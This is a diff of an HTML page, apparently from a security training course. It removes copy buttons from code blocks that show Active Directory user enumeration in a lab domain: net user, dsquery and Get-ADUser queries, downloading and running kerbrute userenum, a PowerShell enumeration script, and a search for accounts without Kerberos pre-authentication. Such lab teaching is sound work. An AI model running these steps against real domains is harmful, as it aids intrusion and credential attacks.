@@ -27,7 +27,7 @@
                 <pre>   
 net user /domain
                 </pre>
-                <button class="copy-btn" onclick="copyToClipboard()">Copy</button>
+                
             </div>
         </div>
          <div class="image-container">
@@ -93,7 +93,7 @@ foreach ($user in $users) {
 }
 
                 </pre>
-                <button class="copy-btn" onclick="copyToClipboard()">Copy</button>
+                
             </div>
         </div>
          <div class="image-container">
@@ -117,7 +117,7 @@ foreach ($user in $users) {
 dsquery user -limit 0 | dsget user -dn | ForEach-Object { ($_ -split ',')[0] -replace 'CN=', '' }
 
                 </pre>
-                <button class="copy-btn" onclick="copyToClipboard()">Copy</button>
+                
             </div>
         </div>
          <div class="image-container">
@@ -139,7 +139,7 @@ dsquery user -limit 0 | dsget user -dn | ForEach-Object { ($_ -split ',')[0] -re
 Get-ADUser -Filter * -Properties SamAccountName | Select-Object SamAccountName
 
                 </pre>
-                <button class="copy-btn" onclick="copyToClipboard()">Copy</button>
+                
             </div>
         </div>
          <div class="image-container">
@@ -175,7 +175,7 @@ foreach ($user in $users) {
     Write-Host "-----------------------------------"
 }
                 </pre>
-                <button class="copy-btn" onclick="copyToClipboard()">Copy</button>
+                
             </div>
         </div>
          <div class="image-container">
@@ -203,7 +203,7 @@ cd C:\temp
 wget https://raw.githubusercontent.com/overgrowncarrot1/maraudersec-classes/refs/heads/main/tools/usernames.txt -o usernames.txt
 
                 </pre>
-                <button class="copy-btn" onclick="copyToClipboard()">Copy</button>
+                
             </div>
         </div>
 
@@ -223,7 +223,7 @@ wget https://raw.githubusercontent.com/overgrowncarrot1/maraudersec-classes/refs
 wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe -o kerbrute.exe
      
                 </pre>
-                <button class="copy-btn" onclick="copyToClipboard()">Copy</button>
+                
             </div>
         </div>
 
@@ -244,7 +244,7 @@ wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_window
 .\kerbrute.exe userenum .\usernames.txt -d maraudersec.local
                     
                 </pre>
-                <button class="copy-btn" onclick="copyToClipboard()">Copy</button>
+                
             </div>
         </div>
          <div class="image-container">
@@ -330,7 +330,7 @@ $usernameListPath = Read-Host "Enter the path to the username list file"
 Invoke-UserEnum -domain $domain -usernameListPath $usernameListPath
 
                 </pre>
-                <button class="copy-btn" onclick="copyToClipboard()">Copy</button>
+                
             </div>
         </div>
 
@@ -415,7 +415,7 @@ Invoke-UserEnum -domain $domain -usernameListPath $usernameListPath
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object Name, SamAccountName
         
                 </pre>
-                <button class="copy-btn" onclick="copyToClipboard()">Copy</button>
+                
             </div>
         </div>
         <div class="image-container">
